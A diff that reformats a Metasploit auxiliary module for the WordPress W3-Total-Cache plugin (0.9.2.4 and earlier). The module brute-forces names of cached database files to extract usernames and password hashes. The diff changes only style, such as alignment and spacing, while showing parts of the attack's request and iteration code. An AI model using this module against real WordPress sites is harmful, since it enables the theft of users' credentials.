@@ -10,27 +10,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'          => 'WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract',
-      'Description'   =>
-        "The W3-Total-Cache Wordpress Plugin <= 0.9.2.4 can cache database statements
+      'Name' => 'WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract',
+      'Description' => "The W3-Total-Cache Wordpress Plugin <= 0.9.2.4 can cache database statements
         and its results in files for fast access. Version 0.9.2.4 has been fixed afterwards
         so it can be vulnerable. These cache files are in the webroot of the Wordpress
         installation and can be downloaded if the name is guessed. This module tries to
         locate them with brute force in order to find usernames and password hashes in these
         files. W3 Total Cache must be configured with Database Cache enabled and Database
         Cache Method set to Disk to be vulnerable",
-      'License'       => MSF_LICENSE,
-      'References'    =>
-        [
-          ['OSVDB', '88744'],
-          ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/242'],
-          ['WPVDB', '6621']
-        ],
-      'Author'        =>
-        [
-          'Christian Mehlmauer',                    # Metasploit module
-          'Jason A. Donenfeld <Jason[at]zx2c4.com>' # POC
-        ]
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['OSVDB', '88744'],
+        ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/242'],
+        ['WPVDB', '6621']
+      ],
+      'Author' => [
+        'Christian Mehlmauer', # Metasploit module
+        'Jason A. Donenfeld <Jason[at]zx2c4.com>' # POC
+      ]
     )
 
     register_options(
@@ -38,7 +35,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TABLE_PREFIX', [true,	'Wordpress table prefix', 'wp_']),
         OptInt.new('SITE_ITERATIONS', [true, 'Number of sites to iterate', 25]),
         OptInt.new('USER_ITERATIONS', [true, 'Number of users to iterate', 25])
-      ])
+      ]
+    )
   end
 
   def table_prefix
@@ -58,13 +56,12 @@ class MetasploitModule < Msf::Auxiliary
     user_url = normalize_uri(target_uri)
     begin
       send_request_cgi(
-        'uri'      => user_url,
-        'method'   => 'GET',
+        'uri' => user_url,
+        'method' => 'GET',
         'vars_get' => {
           'author' => user_id.to_s
         }
       )
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
       vprint_error("Unable to connect to #{user_url}")
     rescue ::Timeout::Error, ::Errno::EPIPE
@@ -106,11 +103,9 @@ class MetasploitModule < Msf::Auxiliary
     users_found = false
 
     (1..site_iterations).each do |site_id|
-
       vprint_status("Trying site_id #{site_id}...")
 
       (1..user_iterations).each do |user_id|
-
         vprint_status("Trying user_id #{user_id}...")
 
         # used to cache the statement
